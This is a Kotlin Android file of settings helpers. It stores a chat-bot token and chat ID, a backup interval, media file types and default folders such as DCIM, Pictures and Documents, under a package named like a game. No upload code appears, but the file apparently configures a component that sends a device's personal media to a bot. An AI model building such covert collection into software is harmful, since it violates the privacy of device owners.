package com.service.assasinscreed02

import android.content.Context

fun guardarConfigBot(context: Context, token: String, chatId: String) {
    val prefs = context.getSharedPreferences("BotConfig", Context.MODE_PRIVATE)
    prefs.edit().putString("bot_token", token).putString("bot_chat_id", chatId).apply()
}

fun obtenerConfigBot(context: Context): Pair<String, String>? {
    val prefs = context.getSharedPreferences("BotConfig", Context.MODE_PRIVATE)
    val token = prefs.getString("bot_token", null)
    val chatId = prefs.getString("bot_chat_id", null)
    return if (token != null && chatId != null) Pair(token, chatId) else null
}

fun guardarIntervalo(context: Context, horas: Int) {
    val prefs = context.getSharedPreferences("config_backup", Context.MODE_PRIVATE)
    prefs.edit().putInt("intervalo_horas", horas).apply()
}

fun obtenerIntervalo(context: Context): Int {
    val prefs = context.getSharedPreferences("config_backup", Context.MODE_PRIVATE)
    return prefs.getInt("intervalo_horas", 24)
}

// Configuración de tipos de archivo
fun guardarTiposArchivo(context: Context, tipos: Set<String>) {
    val prefs = context.getSharedPreferences("config_backup", Context.MODE_PRIVATE)
    prefs.edit().putStringSet("tipos_archivo", tipos).apply()
}

fun obtenerTiposArchivo(context: Context): Set<String> {
    val prefs = context.getSharedPreferences("config_backup", Context.MODE_PRIVATE)
    return prefs.getStringSet("tipos_archivo", setOf("jpg", "jpeg", "png", "mp4", "mov", "avi")) ?: setOf("jpg", "jpeg", "png", "mp4", "mov", "avi")
}

// Configuración de carpetas específicas
fun guardarCarpetasEspecificas(context: Context, carpetas: Set<String>) {
    val prefs = context.getSharedPreferences("config_backup", Context.MODE_PRIVATE)
    prefs.edit().putStringSet("carpetas_especificas", carpetas).apply()
}

fun obtenerCarpetasEspecificas(context: Context): Set<String> {
    val prefs = context.getSharedPreferences("config_backup", Context.MODE_PRIVATE)
    return prefs.getStringSet("carpetas_especificas", setOf("DCIM", "Pictures", "Download", "Documents")) ?: setOf("DCIM", "Pictures", "Download", "Documents")
}

// Configuración de backup por fases
fun guardarBackupPorFases(context: Context, activado: Boolean) {
    val prefs = context.getSharedPreferences("config_backup", Context.MODE_PRIVATE)
    prefs.edit().putBoolean("backup_por_fases", activado).apply()
}

fun obtenerBackupPorFases(context: Context): Boolean {
    val prefs = context.getSharedPreferences("config_backup", Context.MODE_PRIVATE)
    return prefs.getBoolean("backup_por_fases", true)
}

fun guardarConexion(context: Context) {
    val prefs = context.getSharedPreferences("historial", Context.MODE_PRIVATE)
    val actual = System.currentTimeMillis()
    val anterior = prefs.getLong("ultima", 0L)
    prefs.edit().putLong("anterior", anterior).putLong("ultima", actual).apply()
}

fun obtenerHistorial(context: Context): Pair<Long, Long> {
    val prefs = context.getSharedPreferences("historial", Context.MODE_PRIVATE)
    return Pair(prefs.getLong("ultima", 0L), prefs.getLong("anterior", 0L))
} 